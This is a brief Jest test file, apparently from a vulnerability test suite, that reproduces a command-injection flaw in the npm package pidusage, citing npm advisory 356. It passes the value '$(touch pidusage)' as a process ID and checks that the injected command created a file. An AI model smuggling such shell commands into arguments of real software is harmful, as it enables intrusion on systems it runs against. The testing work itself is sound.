// https://www.npmjs.com/advisories/356
test("Command Injection in pidusage", () => {
  expect.assertions(1);
  const os = require("os");
  os.platform = () => {
    return "freebsd";
  };
  const roar_pidusage = require("pidusage");
  const fs = require("fs");
  const path = "./pidusage";
  const sleep = require("sleep");
  roar_pidusage.stat("$(touch pidusage)", function () {});
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(true);
  fs.unlink(path, function (err) {});
});
